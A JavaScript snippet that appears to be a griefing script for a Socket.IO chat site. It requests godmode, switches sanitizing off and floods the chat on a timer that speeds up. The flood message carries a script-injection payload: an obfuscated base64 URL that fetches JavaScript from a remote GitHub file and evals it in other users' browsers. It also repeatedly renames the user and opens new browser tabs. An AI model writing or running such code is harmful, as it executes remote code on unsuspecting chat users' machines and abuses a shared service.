let coughtimer = 7500; // Changed from const to let
socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "COUGH COUGH"]
    });
    window.open("https://www.google.com/search?client=CoughCough&q=cough&sourceid=Cough&ie=Cough", "_blank");
    socket.emit('talk', { text: "Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough, Cough Cough <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'COUGHSPR'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
    coughtimer = coughtimer - 125;
}, coughtimer);
